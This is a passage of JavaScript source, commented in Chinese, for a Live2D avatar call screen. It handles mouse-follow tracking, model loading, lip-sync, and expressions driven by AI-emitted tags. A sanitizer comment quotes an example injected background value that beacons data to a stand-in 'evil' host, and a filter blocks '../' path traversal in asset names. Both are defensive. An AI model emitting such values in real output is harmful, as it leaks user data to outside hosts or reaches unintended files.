      for (const pid of resolveParamIds(slot)) {
        try { cm.setParameterValueById(pid, 0); } catch { /* ignore */ }
      }
    }
  }

  // 读某个参数的量程上限（绝对值）。驱动幅度不能超过它，否则 Cubism 会静默截断，
  // 用户会以为"倍率调高了却没反应"。
  // 带缓存：mouseTrackTick 每 33ms 调一次，而 Cubism 的 getParameterIndex 是线性查找。
  function paramAbsMax(cm, pid) {
    if (paramAbsMaxCache.has(pid)) return paramAbsMaxCache.get(pid);
    let v = 0;
    try {
      const idx = cm.getParameterIndex(pid);
      if (idx >= 0) v = Math.max(Math.abs(cm.getParameterMinimumValue(idx)), Math.abs(cm.getParameterMaximumValue(idx)));
    } catch { /* ignore */ }
    paramAbsMaxCache.set(pid, v);
    return v;
  }

  // 该模型上"头部还能不能再放大"：基础值 20 相对量程上限还剩多少余量。
  // 两个内置模型的转头参数都是 ±30 → ×1.0 就用掉 2/3，×1.5 之后到顶。
  function headSaturateK(cm) {
    let maxAbs = 0;
    for (const pid of resolveParamIds('headX')) maxAbs = Math.max(maxAbs, paramAbsMax(cm, pid));
    if (!maxAbs) return Infinity;      // 读不到量程就不限制（Cubism 自己会截断）
    return maxAbs / 20;                // ×N 的 N
  }

  function setMouseFollowScale(level) {
    const n = Number(level);
    mouseFollowScale = Number.isFinite(n)
      ? Math.max(0, Math.min(MOUSE_SCALE_MAX, Math.round(n)))
      : MOUSE_SCALE_BASE;
    try { localStorage.setItem('live2d.mouseFollowScale', String(mouseFollowScale)); } catch { /* ignore */ }
    // 幅度调到 0 等于"不跟随"，模型应立即回正，而不是停在上一帧歪着的角度
    if (mouseFollowScale === 0) {
      mouseTarget = { x: 0, y: 0 };
      mouseCurrent = { x: 0, y: 0 };
      resetFollowParams();
    } else {
      // 立刻按新倍率重算一帧。否则"鼠标不动、只改倍率"时模型会一直停在旧倍率的姿态：
      // mouseTrackTick 在插值稳定后就 clearInterval 了，没有鼠标事件不会再被触发。
      applyFollowDrive();
    }
    return mouseFollowScale;
  }

  function setMouseFollow(on) {
    mouseFollowEnabled = Boolean(on);
    try { localStorage.setItem('live2d.mouseFollow', mouseFollowEnabled ? '1' : '0'); } catch { /* ignore */ }
    if (!mouseFollowEnabled) {
      // 关闭时把目标与当前值都归零，并把模型的角度参数复位，避免停在歪着的位置
      mouseTarget = { x: 0, y: 0 };
      mouseCurrent = { x: 0, y: 0 };
      resetFollowParams();
    }
    syncFollowHint();
  }

  // 通话界面上提示"鼠标跟随已关闭"（关闭时模型不动，容易被误认为模型不支持跟随）
  function syncFollowHint() {
    const hint = document.getElementById('live2d-follow-hint');
    if (!hint) return;
    hint.classList.toggle('on', isOpen && !mouseFollowEnabled);
  }

  // 静音状态提示。[操作:静音] 以前只改了一个早已从 UI 移除的按钮，
  // 静音后通话界面毫无反馈，用户不知道 AI 为什么不说话了。
  function syncMuteHint() {
    const hint = document.getElementById('live2d-mute-hint');
    if (!hint) return;
    hint.classList.toggle('on', isOpen && aiVoiceMuted);
  }

  // 挂载/恢复鼠标追踪监听器（幂等）。
  // 必须每次 open() 都调用一次：close() 会移除监听器并置空，而 buildUI() 只执行一次，
  // 若只在 buildUI 里挂载，"关闭通话 → 再打开"之后鼠标跟随会永久失效。
  function ensureMouseTracking() {
    if (mouseMoveHandler) return;
    const stageEl = document.getElementById('live2d-stage');
    if (!stageEl) return;
    mouseMoveHandler = (e) => {
      if (!mouseFollowEnabled) return; // 设置里关掉了鼠标跟随
      if (dragState) return;           // 正在拖拽调整框时不要跟着转头
      const rect = stageEl.getBoundingClientRect();
      const w = rect.width || window.innerWidth || 1;
      const h = rect.height || window.innerHeight || 1;
      if (!w || !h) return;
      const nx = (e.clientX - rect.left) / w;
      const ny = (e.clientY - rect.top) / h;
      mouseTarget.x = Math.max(-1, Math.min(1, (nx - 0.5) * 2));
      mouseTarget.y = Math.max(-1, Math.min(1, (0.5 - ny) * 2));
      if (!mouseTrackRaf) mouseTrackRaf = setInterval(mouseTrackTick, 33);
    };
    // 监听整个通话层（不是只有画布）：鼠标移到顶栏/底栏附近时也能继续跟随
    stageEl.addEventListener('pointermove', mouseMoveHandler);
  }

  // 把当前 mouseCurrent 按当前倍率写进模型参数。
  // 单独抽出来是因为：mouseTrackTick 在插值稳定后会 clearInterval 停掉，
  // 此时若用户只改倍率而鼠标不动，就再没有任何东西会去重算 —— 模型会停在旧倍率的姿态上。
  function applyFollowDrive() {
    const coreModel = model?.internalModel?.coreModel;
    if (!coreModel || typeof coreModel.setParameterValueById !== 'function') return;
    // 幅度倍率：1 = 原始幅度（×1.0）。模型对参数的敏感度天生不同，靠这个系数拉平。
    const k = mouseFollowScale / MOUSE_SCALE_BASE;
    const x = mouseCurrent.x * k;
    const y = mouseCurrent.y * k;
    // 转头：驱动该模型所有真实存在的角度参数。
    // 不同作者会把同一个"转头"绑在 ParamAngleX 或 ParamAngleX1/Y1 上，
    // 只写标准名的话，遇到把标准名留空的模型就完全没反应（悠小喵就是这种）。
    //
    // ⚠️ 这里不可能"无限放大"：参数值会被 Cubism 按模型自身量程截断。
    // 实测 LSS 的 ParamAngleX 与悠小喵的 ParamAngleX1 量程都是 ±30，
    // 基础值 20 已经用掉 2/3 → 倍率超过约 ×1.5 就没有任何视觉变化。
    // 想再往上只能靠下面的"身体跟随"，这也是数字框"解锁更高"的真正作用。
    for (const pid of resolveParamIds('headX')) coreModel.setParameterValueById(pid, x * 20);
    for (const pid of resolveParamIds('headY')) coreModel.setParameterValueById(pid, y * 16);
    // 眼球量程只有 ±1，所以：① 基准取 0.8（原 1.3 会让眼睛一动就顶到边界、永远贴着边）；
    // ② 倍率按平方根缓动，低倍率同步变灵敏、高倍率不会一动手就"眼睛贴边"。
    const eyeK = Math.sqrt(Math.max(k, 0));
    for (const pid of resolveParamIds('eyeBallX')) coreModel.setParameterValueById(pid, x * 0.8 * eyeK);
    for (const pid of resolveParamIds('eyeBallY')) coreModel.setParameterValueById(pid, y * 0.8 * eyeK);
    // 身体跟随：×1.0 时为 0（完全保持原行为），×3.0 时到达该模型身体参数的量程上限。
    // 头部到顶后由它继续把"幅度"补上去，否则"解锁更高倍率"在头部满量程后就是空转。
    const bodyK = Math.max(0, Math.min(1, (k - 1) / BODY_GAIN_SPAN));
    for (const pid of resolveParamIds('bodyX')) {
      const maxAbs = paramAbsMax(coreModel, pid) || 10;
      coreModel.setParameterValueById(pid, mouseCurrent.x * maxAbs * bodyK);
    }
    for (const pid of resolveParamIds('bodyY')) {
      const maxAbs = paramAbsMax(coreModel, pid) || 10;
      coreModel.setParameterValueById(pid, mouseCurrent.y * maxAbs * bodyK);
    }
  }

  // 鼠标追踪：平滑插值并驱动头部/眼球/身体参数（setInterval 驱动，兼容各种环境）
  function mouseTrackTick() {
    mouseCurrent.x += (mouseTarget.x - mouseCurrent.x) * 0.14;
    mouseCurrent.y += (mouseTarget.y - mouseCurrent.y) * 0.14;
    applyFollowDrive();
    const settled = Math.abs(mouseTarget.x - mouseCurrent.x) < 0.002 && Math.abs(mouseTarget.y - mouseCurrent.y) < 0.002;
    if (settled && mouseTrackRaf) { clearInterval(mouseTrackRaf); mouseTrackRaf = null; }
  }

  function close() {
    isOpen = false;
    speaking = false;
    mouthEnergy = 1;
    voiceEnergy = null; // 必须复位：否则下次通话会沿用上一轮残留的真实音量，嘴型一开始就是张着的
    currentExpParams = [];
    if (container) container.classList.remove('open');
    adjustBoxVisible = false;
    dragState = null;
    const box = document.getElementById('live2d-resize-box');
    if (box) box.classList.remove('show', 'resizing');
    const btn = document.getElementById('live2d-adjust-toggle');
    if (btn) btn.classList.remove('active');
    if (watermarkKeyHandler) {
      window.removeEventListener('keydown', watermarkKeyHandler);
      watermarkKeyHandler = null;
    }
    // 移除鼠标追踪并复位参数
    if (mouseMoveHandler) {
      const stageEl = document.getElementById('live2d-stage');
      stageEl?.removeEventListener('pointermove', mouseMoveHandler);
      mouseMoveHandler = null;
    }
    syncFollowHint();
    syncMuteHint();
    if (mouseTrackRaf) { clearInterval(mouseTrackRaf); mouseTrackRaf = null; }
    // 停掉 PIXI 的 ticker：隐藏时没必要继续每帧渲染，open() 会重新 start
    try { app?.ticker?.stop?.(); } catch { /* ignore */ }
    mouseTarget = { x: 0, y: 0 };
    mouseCurrent = { x: 0, y: 0 };
    if (model) {
      // 复位同样按"该模型真实存在的角度参数"来，避免残留把头转着
      try { resetFollowParams(); } catch { /* ignore */ }
      try { model.internalModel?.coreModel?.setParameterValueById?.('ParamMouthOpenY', 0); } catch { /* ignore */ }
    }
  }

  // 并发保护：下拉切换、删除模型、open() 都可能同时触发加载。
  // 旧实现没有守卫：两次加载会各自 await，后完成的那次覆盖 model，
  // 而被覆盖的实例已经 addChild 但没人 destroy —— 双模型叠加渲染 + 显存泄漏。
  let modelLoadSeq = 0;

  async function loadModel() {
    if (!app || !selectedModel) return;
    const seq = ++modelLoadSeq;
    const tag = document.getElementById('live2d-name-tag');
    const info = getSelectedModelInfo();
    const modelName = selectedModel;
    const stale = () => seq !== modelLoadSeq; // 期间又来了新的加载请求
    modelAssetListKnown = false;              // 换模型期间清单未知，先回到回退行为
    try {
      if (!info || !info.modelJson) {
        if (tag) tag.textContent = '未在模型中找到 .model3.json';
        return;
      }
      const modelJsonPath = modelAssetUrl(modelName, info.modelJson);
      if (model) { try { app.stage.removeChild(model); model.destroy?.(); } catch { /* ignore */ } model = null; }
      // 等待 cubism4 核心就绪
      if (PIXI.live2d?.cubism4Ready) await PIXI.live2d.cubism4Ready;
      const created = await PIXI.live2d.Live2DModel.from(modelJsonPath, { autoInteract: false });
      if (stale()) { try { created.destroy?.(); } catch { /* ignore */ } return; }
      model = created;
      // 尽早记录当前模型可用表情/动作（供 AI 决策 + 语义映射兜底），避免后续步骤异常时丢失
      currentModelExps = Array.isArray(info.exps) ? info.exps.slice() : [];
      currentModelMotions = Array.isArray(info.motions) ? info.motions.slice() : [];
      modelAssetListKnown = true; // 清单已拿到：哪怕是空的，也能确定"这个模型没有表情文件"
      // 读取该模型的真实参数表（情绪参数按语义槽解析成真实参数名，换模型必须重算）
      refreshModelParamIds();
      // 尽早探测水印开关并恢复上次状态（不依赖 addChild 等后续步骤）
      await detectWatermark(info);
      if (stale()) return;
      // 确保 renderer 与容器尺寸一致（resizeTo 在首帧才生效）
      const wrap = document.getElementById('live2d-canvas-wrap');
      if (wrap && wrap.clientWidth > 0 && wrap.clientHeight > 0) {
        app.renderer.resize(wrap.clientWidth, wrap.clientHeight);
      }
      // 图片网格交互：中心锚点，缩放以模型中心为基准
      model.anchor.set(0.5, 0.5);
      // 读取该模型的尺寸/位置记忆（含旧版迁移）
      resizeState = loadResizeState();
      // 首次使用 / 旧版迁移：按屏幕高度比例换算初始缩放
      if (legacyScaleHint != null || needsInitScale) {
        const u = modelUnitBounds();
        if (u && u.h > 0) {
          const s = clampScale((app.screen.height * (legacyScaleHint != null ? legacyScaleHint : 0.65)) / u.h);
          resizeState.sx = s;
          resizeState.sy = s;
          legacyScaleHint = null;
          needsInitScale = false;
          saveResizeState();
        }
      }
      applyModelSize();
      app.stage.addChild(model);
      if (tag) tag.textContent = modelName;
      updateResizeBox();
      startRenderLoop();
      console.log('[Live2D] 模型加载成功:', modelName, modelJsonPath);
    } catch (err) {
      if (stale()) return;
      console.error('[Live2D] 模型加载失败:', err);
      if (tag) tag.textContent = '模型加载失败：' + (err.message || err);
    }
  }

  // ===== 渲染循环（嘴部动画 + 选择框跟随） =====
  function applyModelSize() {
    if (!model || !app) return;
    resizeState.sx = clampScale(resizeState.sx);
    resizeState.sy = clampScale(resizeState.sy);
    model.scale.set(resizeState.sx, resizeState.sy);
    model.position.set(resizeState.cx * app.screen.width, resizeState.cy * app.screen.height);
  }

  // ===== 背景 =====
  // 背景值最终会写进 CSS 的 background 属性，而它的来源包括 AI 的 [背景:xxx] 标签。
  // 不校验的话 `[背景:url(https://evil/?leak)]` 就能让浏览器主动去访问外部地址
  // （隐私泄漏 / 追踪信标）；`;` `}` 之类还能用来闭合声明注入别的样式。
  // 只放行：data: 图片、本服务内相对路径、渐变、纯色。
  function sanitizeBackground(v) {
    const s = String(v == null ? '' : v).trim();
    if (!s) return '';
    if (/[;{}]|expression\s*\(|javascript:|@import|<\/|\\/i.test(s)) return '';
    if (/^url\(\s*["']?data:image\/[a-z0-9.+-]+;base64,[a-z0-9+/=\s]+["']?\s*\)$/i.test(s)) return s;
    if (/^url\(\s*["']?\/?[\w./\-%\u4e00-\u9fa5]+["']?\s*\)$/i.test(s)) return s;
    if (/^linear-gradient\([^();{}]*\)$/i.test(s)) return s;
    if (/^#[0-9a-f]{3,8}$/i.test(s)) return s;
    if (/^rgba?\([\d\s.,%]+\)$/i.test(s)) return s;
    console.warn('[Live2D] 已忽略不受支持的背景值:', s.slice(0, 120));
    return '';
  }

  let bgStyle = (function () {
    try { return sanitizeBackground(localStorage.getItem('live2d.bg') || ''); } catch { return ''; }
  })();

  function applyBackground() {
    const stage = document.getElementById('live2d-stage');
    if (!stage) return;
    if (bgStyle.startsWith('url(') || bgStyle.startsWith('data:') || bgStyle.startsWith('linear-gradient') || bgStyle.startsWith('#') || bgStyle.startsWith('rgb')) {
      // 图片或渐变/纯色背景：画布透明，背景由 CSS 显示
      stage.style.background = bgStyle;
      stage.style.backgroundSize = 'cover';
      stage.style.backgroundPosition = 'center';
      if (app) app.renderer.background = 0x000000, app.renderer.backgroundAlpha = 0;
    } else {
      stage.style.background = 'linear-gradient(135deg,#0f2027,#203a43,#2c5364)';
      stage.style.backgroundSize = '';
      if (app) app.renderer.background = 0x0b0e14, app.renderer.backgroundAlpha = 1;
    }
  }

  function startRenderLoop() {
    if (rafRunning || !model) return;
    rafRunning = true;
    const tick = () => {
      if (!isOpen || !model) { rafRunning = false; return; }
      // 保持 canvas 内部分辨率与容器 CSS 尺寸一致，避免模型被拉伸变形
      const wrap = document.getElementById('live2d-canvas-wrap');
      if (wrap && wrap.clientWidth > 0 && wrap.clientHeight > 0 &&
          (wrap.clientWidth !== app.screen.width || wrap.clientHeight !== app.screen.height)) {
        app.renderer.resize(wrap.clientWidth, wrap.clientHeight);
        applyModelSize();
      }
      // 注意：这里**不能**再调 app.ticker.update()。
      // PIXI Application 在 autoStart 下已经把自己的 ticker 跑在 rAF 上（其中就包含 renderer.render），
      // 这里再手动 update 一次，等于每帧把整棵场景重复渲染一遍（纯浪费）。
      // 待机动画/物理由 PIXI 自己的 ticker 推进，本循环只负责尺寸对齐、嘴型与调整框。
      if (speaking) updateMouth();
      if (!dragState) updateResizeBox();
      requestAnimationFrame(tick);
    };
    requestAnimationFrame(tick);
  }

  function updateMouth() {
    let wave;
    if (voiceEnergy != null) {
      // 真实语音音量驱动（VAD）：音量 + 微抖动模拟自然说话节奏
      wave = (0.12 + 0.88 * voiceEnergy) * mouthEnergy + 0.06 * Math.sin(performance.now() / 45);
    } else {
      // 无真实音量时用正弦波模拟（原有行为）
      wave = (0.35 + 0.65 * Math.abs(Math.sin(performance.now() / 120))) * mouthEnergy;
    }
    const value = Math.min(1, Math.max(0.08, wave));
    try {
      model.internalModel?.coreModel?.setParameterValueById?.('ParamMouthOpenY', value);
    } catch { /* ignore */ }
  }

  function startMouth() {
    speaking = true;
    const ind = document.getElementById('live2d-speaking');
    if (ind) ind.classList.add('on');
  }

  function stopMouth() {
    speaking = false;
    mouthEnergy = 1;
    voiceEnergy = null;
    const ind = document.getElementById('live2d-speaking');
    if (ind) ind.classList.remove('on');
    if (model) {
      try { model.internalModel?.coreModel?.setParameterValueById?.('ParamMouthOpenY', 0); } catch { /* ignore */ }
    }
  }

  // ===== 表情 / 动作 =====
  // 注意：pixi-live2d-display 的 model.expression() 播放 exp3 在本库版本下参数不生效
  // （水印修复时已证实）。因此这里读取 exp3.json 的 Parameters 直接驱动 coreModel 参数，更可靠。

  // 表情/动作同义词组：AI 输出的情绪词与模型实际文件名是近义词时也能匹配（跨模型自适应）
  const EXP_SYNONYM_GROUPS = [
    ['开心', '高兴', '喜悦', '快乐', '微笑', '笑', 'happy', 'smile', 'laugh'],
    ['难过', '伤心', '悲伤', '沮丧', '哭', 'sad', 'cry'],
    ['生气', '愤怒', '怒', '恼火', 'angry'],
    ['害羞', '脸红', '羞涩', 'blush', 'shy'],
    ['惊讶', '震惊', '吃惊', '吓', 'surprised', 'dizzy'],
    ['思考', '思索', '想', 'think'],
    ['平静', '常规', '默认', '普通', 'calm', 'normal', 'idle'],
    ['晕', '眩晕', 'dizzy'],
    ['委屈', '泪', 'cry'],
    ['挥手', '招', 'wave'],
    ['鞠躬', 'bow'],
  ];

  // 表情/动作名最终会被拼进 URL 路径。encodeURIComponent 不编码字符 '.'，
  // 所以 `[表情:../../x]` 这种输入必须在这里挡掉：Web 端还有"隐藏文件"规则兜底，
  // 但 Android（Capacitor）走本地文件系统，没有那层保护。
  function sanitizeAssetName(name) {
    const s = String(name || '').trim();
    if (!s) return '';
    if (s.includes('/') || s.includes('\\') || s.includes('..') || s.startsWith('.')) return '';
    return s;
  }

  // 在当前模型 exps/motions 里模糊匹配目标名（子串 → 同义词组）
  // 注意：双向 includes 在 target 只有 1 个字符时会命中任意文件名（"a" 命中 "脸a红"），
  // 因此要求两者的有效长度都 >= 2 再参与模糊匹配。
  // 清单里的元素是「相对模型根目录的路径」（可能带子目录），比较时只看文件名部分，
  // 返回时把完整相对路径带回去 —— 调用方要用它拼 URL。
  function fuzzyMatchFileName(target, files, ext) {
    const t = String(target || '').trim();
    if (t.length < 2) return null;
    const strip = (f) => f.replace(new RegExp('\\.' + ext + '\\.json$', 'i'), '');
    const baseNameOf = (f) => strip(f).split('/').pop();
    const usable = (base) => base.length >= 2;
    const hit1 = files.find(f => {
      const base = baseNameOf(f);
      return usable(base) && (base.includes(t) || t.includes(base));
    });
    if (hit1) return strip(hit1);
    const group = EXP_SYNONYM_GROUPS.find(g => g.some(w => t.includes(w) || w.includes(t)));
    if (group) {
      const hit2 = files.find(f => {
        const base = baseNameOf(f);
        return usable(base) && group.some(w => base.includes(w) || w.includes(base));
      });
      if (hit2) return strip(hit2);
    }
    return null;
  }

  // 把 AI 给的名称解析成当前模型实际存在的表情文件名（无扩展名）
  // 优先级：语义映射键（EXPRESSION_MAP）→ 精确文件名 → 模糊/同义词匹配 → 原样
  // 当前模型的表情/动作清单是否已经拿到。
  // 用于区分两种情况：①"还没加载出来/未知"（保持旧的回退行为）
  //                 ②"已经拿到，但模型根本没有 exp 目录"（此时任何表情名都必然 404，必须直接放弃）
  function resolveExpressionFile(name) {
    const raw = sanitizeAssetName(String(name || '').trim().replace(/\.(exp3|motion3)\.json$/i, ''));
    if (!raw) return '';
    const mapped = EXPRESSION_MAP[raw] || raw;
    if (!currentModelExps.length) {
      // 清单已知却为空 → 这个模型没有任何表情文件，别再发注定 404 的请求
      if (modelAssetListKnown) {
        console.warn('[Live2D] 当前模型没有表情文件，表情标签已忽略:', raw);
        return '';
      }
      return mapped; // 清单未知时保持原行为
    }
    // 清单元素是「相对模型根目录的路径」。先按整条路径比（调用方直接给路径时），
    // 再按文件名比（绝大多数情况：AI 只知道表情叫什么）。
    // 返回值同样是相对路径（去掉扩展名），调用方据此拼 URL —— 不能只返回文件名，
    // 否则子目录里的文件会拼错地址。
    const byPath = currentModelExps.find(f => f.replace(/\.exp3\.json$/i, '') === mapped);
    if (byPath) return byPath.replace(/\.exp3\.json$/i, '');
    const byBase = currentModelExps.find(f => f.split('/').pop().replace(/\.exp3\.json$/i, '') === mapped);
    if (byBase) return byBase.replace(/\.exp3\.json$/i, '');
    const fuzzy = fuzzyMatchFileName(mapped, currentModelExps, 'exp3');
    if (fuzzy) return fuzzy;
    // 明确匹配不到 → 返回空串让调用方跳过，不要再去 fetch 一个必然 404 的路径
    console.warn('[Live2D] 当前模型没有可用的表情文件:', raw, '（映射为', mapped + '）');
    return '';
  }

  function resolveMotionFile(name) {
    const raw = sanitizeAssetName(String(name || '').trim().replace(/\.(exp3|motion3)\.json$/i, ''));
    if (!raw) return '';
    const mapped = MOTION_MAP[raw] || raw;
    if (!currentModelMotions.length) {
      if (modelAssetListKnown) {
        console.warn('[Live2D] 当前模型没有动作文件，动作标签已忽略:', raw);
        return '';
      }
      return mapped; // 动作列表未知时保持原行为
    }
    const byPath = currentModelMotions.find(f => f.replace(/\.motion3\.json$/i, '') === mapped);
    if (byPath) return byPath.replace(/\.motion3\.json$/i, '');
    const byBase = currentModelMotions.find(f => f.split('/').pop().replace(/\.motion3\.json$/i, '') === mapped);
    if (byBase) return byBase.replace(/\.motion3\.json$/i, '');
    const fuzzy = fuzzyMatchFileName(mapped, currentModelMotions, 'motion3');
    if (fuzzy) return fuzzy;
    console.warn('[Live2D] 当前模型没有可用的动作文件:', raw, '（映射为', mapped + '）');
    return '';
  }

  let currentExpParams = []; // 当前表情驱动的参数 [{id, prev}]，切换时先复位避免叠加

  // 复位上一次表情设置的参数（恢复应用前原值）
  function resetExpressionParams(coreModel) {
    if (!coreModel || !currentExpParams.length) return;
    for (const p of currentExpParams) {
      try {
        coreModel.setParameterValueById(p.id, p.prev !== undefined ? p.prev : 0);
      } catch { /* ignore */ }
    }
    currentExpParams = [];
  }

  // 表情切换的并发保护：driveText 是"即发即忘"地调用它，而内部含 fetch/await。
  // 连续两次回复（或流式分片）会让两次调用交错：后一次的 resetExpressionParams 会清掉
  // 前一次刚写进去的参数，表现为"表情切了但脸还停在上一张"。用自增序号保证只有最后一次生效。
  let expressionSeq = 0;

  async function setExpression(name) {
    const target = model;
    if (!target) return false;
    const seq = ++expressionSeq;
    const modelName = selectedModel;
    const raw = String(name || '').trim().replace(/\.(exp3|motion3)\.json$/i, '');
    // 复位表情：[表情:default] / [表情:常规] / [表情:reset] → 恢复所有参数
    if (/^(default|none|reset|clear|常规|默认|正常)$/i.test(raw)) {
      if (seq !== expressionSeq) return false;
      resetExpressionParams(target.internalModel?.coreModel);
      currentExpression = null;
      console.log('[Live2D] 表情已复位');
      return true;
    }
    const expName = resolveExpressionFile(raw);
    if (!expName) {
      // 没有匹配的表情文件：复位上一个表情的参数，避免"换了情绪但脸还停在上一张"
      if (seq !== expressionSeq) return false;
      resetExpressionParams(target.internalModel?.coreModel);
      currentExpression = null;
      return false;
    }
    try {
      const url = modelAssetUrl(modelName, expName + '.exp3.json');
      const res = await fetch(url);
      if (seq !== expressionSeq) return false; // 已有更新的表情请求，丢弃这次结果
      if (res.ok) {
        const json = await res.json();
        if (seq !== expressionSeq) return false;
        const params = json && Array.isArray(json.Parameters) ? json.Parameters : null;
        const coreModel = target.internalModel?.coreModel;
        if (params && params.length && coreModel && typeof coreModel.setParameterValueById === 'function') {
          // 关键：先复位上一个表情的参数，再应用新表情，避免参数叠加导致"切换不成功"
          resetExpressionParams(coreModel);
          const applied = [];
          for (const p of params) {
            const pid = p?.Id;
            if (!pid) continue;
            const value = Number(p.Value ?? 0);
            const blend = String(p.Blend || 'Overwrite');
            const cur = typeof coreModel.getParameterValueById === 'function' ? Number(coreModel.getParameterValueById(pid) || 0) : 0;
            let next;
            if (blend === 'Multiply') next = cur * value;
            else if (blend === 'Add') next = cur + value;
            else next = value;
            coreModel.setParameterValueById(pid, Math.max(-1, Math.min(1, next)));
            applied.push({ id: pid, prev: cur });
          }
          currentExpParams = applied;
          currentExpression = raw;
          console.log('[Live2D] 表情:', expName, '(直接驱动参数)');
          return true;
        }
      }
      // 兜底：无参数信息或 coreModel 不可用时退回库的 expression
      await target.expression(url);
      if (seq !== expressionSeq) return false;
      currentExpression = raw;
      return true;
    } catch (err) {
      console.warn('[Live2D] 表情触发失败:', expName, err);
      return false;
    }
  }

  async function playMotion(name) {
    const target = model;
    if (!target) return;
    const motionName = resolveMotionFile(name);
    if (!motionName) return;
    const modelName = selectedModel;
    try {
      await target.motion(modelAssetUrl(modelName, motionName + '.motion3.json'));
      if (model !== target) return; // 期间换了模型，这次动作结果作废
      console.log('[Live2D] 动作:', motionName);
    } catch (err) {
      console.warn('[Live2D] 动作触发失败:', motionName, err);
    }
  }

  function cycleExpression() {
    const keys = Object.keys(EXPRESSION_MAP);
    const idx = keys.indexOf(currentExpression);
    const next = keys[(idx + 1) % keys.length];
    void setExpression(next);
  }

  // ===== 情绪系统：LLM 通过 [情绪:xxx] 或触发词驱动 =====
  //
  // ⚠️ 重要前提：不同模型的参数命名并不统一，而 Cubism 运行时对**不存在的参数名不报错**——
  // setParameterValueById 会静默接受、getParameterValueById 还能读回刚写的值，但该参数没有任何
  // 绘制绑定，画面完全不变。这类"看起来生效、实际零效果"的问题极难发现，因此这里一律：
  //   ① 先取模型真实参数表 → ② 按语义槽解析真实参数名 → ③ 解析不到就跳过并告警，绝不硬写。
  // 例：悠小喵没有 ParamSmile/ParamCheek/ParamBrowL/ParamEyeLOpening，
  //     用的是 ParamEyeLSmile/ParamCheekPuff/ParamBrowLY/ParamEyeLOpen。
  let currentModelParamIds = new Set();
  const resolvedParamListCache = new Map();
  const paramAbsMaxCache = new Map();   // 参数名 → 量程上限（绝对值），换模型时清空

  // 语义槽 → 候选参数名（按优先级，覆盖常见命名习惯）
  // smile 把 ParamMouthForm 排在眼睛笑意之前：嘴型是"笑"最直接的可见线索，
  // 而且不少模型（如悠小喵）根本没绑定 ParamEyeLSmile，只绑了 ParamMouthForm。
  const PARAM_CANDIDATES = {
    smile: ['ParamSmile', 'ParamMouthForm', 'ParamEyeLSmile', 'ParamEyeRSmile'],
    cheek: ['ParamCheek', 'ParamCheekPuff'],
    browL: ['ParamBrowL', 'ParamBrowLY', 'ParamBrowLForm'],
    browR: ['ParamBrowR', 'ParamBrowRY', 'ParamBrowRForm'],
    eyeL: ['ParamEyeLOpening', 'ParamEyeLOpen'],
    eyeR: ['ParamEyeROpening', 'ParamEyeROpen'],
    mouth: ['ParamMouthOpenY', 'ParamMouthOpen'],
    // 转头/眼球：很多模型把标准名 ParamAngleX/Y 留空，真正的绑定在 ParamAngleX1/Y1 上，
    // 所以这两槽驱动"所有真实存在的候选"而不是只取第一个。
    //
    // ⚠️ 只收 标准名 和 1 号变体，不要 X2/Y2：
    // 实测悠小喵的 ParamAngleY2 并不是"低头/抬头"，设它会让整个模型（连水印层）一起下沉前倾，
    // 看起来像模型朝鼠标扑过来，非常突兀。带 2 的变体在不同模型里可能是整体位移/整体旋转，
    // 语义不可靠，宁可不驱动。
    headX: ['ParamAngleX', 'ParamAngleX1'],
    headY: ['ParamAngleY', 'ParamAngleY1'],
    eyeBallX: ['ParamEyeBallX'],
    eyeBallY: ['ParamEyeBallY'],
    // 身体角度：只在"头部已经到量程上限"之后才介入（见 mouseTrackTick）。
    // 头部的转动幅度被模型自身的参数上限锁死（实测 LSS 与悠小喵的转头参数都是 ±30，
    // 基础值 20 已经用掉三分之二），所以倍率超过约 ×1.5 就完全没有效果了。
    // 想让"解锁更高倍率"真的产生变化，只能在头部满量程后带动身体一起转。
    bodyX: ['ParamBodyAngleX', 'ParamBodyAngleX1'],
    bodyY: ['ParamBodyAngleY', 'ParamBodyAngleY1'],
  };
  // 兜底关键字（精确候选名都没命中时，按语义在参数表里模糊找）
  const PARAM_KEYWORDS = {
    smile: /smile/i, cheek: /cheek/i,
    browL: /^parambrowl/i, browR: /^parambrowr/i,
    eyeL: /^parameyel.*open/i, eyeR: /^parameyer.*open/i,
    mouth: /^parammouth.*open/i,
    headX: /^paramanglex/i, headY: /^paramangley/i,
    eyeBallX: /^parameyeballx/i, eyeBallY: /^parameybally/i,
    bodyX: /^parambodyanglex/i, bodyY: /^parambodyangley/i,
  };
  // 需要"驱动所有存在的候选"的槽（模型可能把同一动作拆到多个参数上）
  const MULTI_PARAM_SLOTS = new Set(['headX', 'headY', 'eyeBallX', 'eyeBallY', 'bodyX', 'bodyY']);

  // 读取当前模型真实参数表（换模型后必须重算）
  function refreshModelParamIds() {
    currentModelParamIds = new Set();
    resolvedParamListCache.clear();
    paramAbsMaxCache.clear();   // 换了模型，量程缓存必须作废
    try {
      const core = model?.internalModel?.coreModel;
      if (!core) return;
      if (Array.isArray(core._parameterIds)) {
        for (const id of core._parameterIds) currentModelParamIds.add(String(id));
      } else if (core._parameterIds && core._parameterIds._ptr) {
        // Cubism 的 csmVector 内部是 _ptr 数组
        for (const id of Array.prototype.slice.call(core._parameterIds._ptr)) currentModelParamIds.add(String(id));
      } else if (typeof core.getParameterCount === 'function' && typeof core.getParameterId === 'function') {
        for (let i = 0; i < core.getParameterCount(); i++) {
          const id = core.getParameterId(i);
          if (id) currentModelParamIds.add(String(id));
        }
      }
    } catch { /* ignore */ }
    console.log('[Live2D] 模型参数表:', currentModelParamIds.size, '个');
  }

  // 把语义槽解析成该模型真实存在的参数名列表；解析不到返回 []（调用方跳过，绝不硬写）
  function resolveParamIds(slot) {
    if (resolvedParamListCache.has(slot)) return resolvedParamListCache.get(slot);
    let list = [];
    if (currentModelParamIds.size) {
      const cands = PARAM_CANDIDATES[slot] || [];
      const hit = cands.filter(id => currentModelParamIds.has(id));
      list = MULTI_PARAM_SLOTS.has(slot) ? hit : hit.slice(0, 1);
      if (!list.length) {
        const kw = PARAM_KEYWORDS[slot];
        if (kw) {
          for (const id of currentModelParamIds) { if (kw.test(id)) { list = [id]; break; } }
        }
      }
    }
    resolvedParamListCache.set(slot, list);
    return list;
  }

  // 单值槽：取第一个（表情/情绪参数组用）
  function resolveParamId(slot) { return resolveParamIds(slot)[0] || ''; }

  // FACS 简化：情绪 → 语义参数槽（不写死参数名，由 resolveParamId 落地到真实参数）
  const EMOTION_PARAM_SETS = {
    happy: { smile: 0.9, eyeL: 1.15, eyeR: 1.15, cheek: 0.6 },
    sad: { browL: -0.35, browR: -0.35, eyeL: 0.45, eyeR: 0.45, mouth: 0.2 },
